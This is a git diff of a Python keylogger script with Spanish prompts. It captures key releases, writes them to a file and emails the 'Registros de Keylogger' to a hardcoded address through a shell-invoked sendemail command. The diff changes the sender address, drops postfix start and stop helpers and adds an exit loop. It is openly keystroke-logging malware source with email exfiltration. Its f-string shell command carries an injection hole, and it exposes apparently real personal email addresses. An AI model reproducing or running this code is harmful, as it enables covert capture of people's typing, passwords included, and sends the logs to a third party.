@@ -11,15 +11,10 @@ def output(text):
         f.write(text)
 
 def send_email(sender_email, receiver_email, mensaje):
-    command = f"sendemail -f {sender_email} -t {receiver_email} -u 'Registros de Keylogger' -m '{mensaje}'"
+    command = f"sendemail -f {sender_email} -t {receiver_email} -u 'Registros de Keylogger' -m 'output.txt'"
 
     subprocess.run(command, shell=True)
 
-def start_postfix():
-    subprocess.run(["systemctl", "start", "postfix"])
-
-def stop_postfix():
-    subprocess.run(["systemctl", "stop", "postfix"])
 
 def main():
     print("---------------------------------")
@@ -34,6 +29,12 @@ def main():
         return
     
     keyboard.on_release(callback)
+
+    print("Telclea Exit en el caso de terminar la ejecución del KeyBoard")
+    while True:
+        if input() == 'exit':
+            print("Terminando la ejecución del programa...")
+            break
             
     keyboard.unhook_all()
     
@@ -43,14 +44,10 @@ def main():
     output(registro)
     
     if respuesta_email.lower() in ['yes', 'y']:
-        sender_email = "janet1204@ciencias.unam.mx"
+        sender_email = "PaoPatrol_PJAB@hotmail.com"
         receiver_email = "Paola_VB@ciencias.unam.mx"
-    
-        start_postfix()
         
         send_email(sender_email, receiver_email, registro)
-        
-        stop_postfix()
         
     if respuesta_guardar.lower() in ['yes', 'y']:
         remove('output.txt')
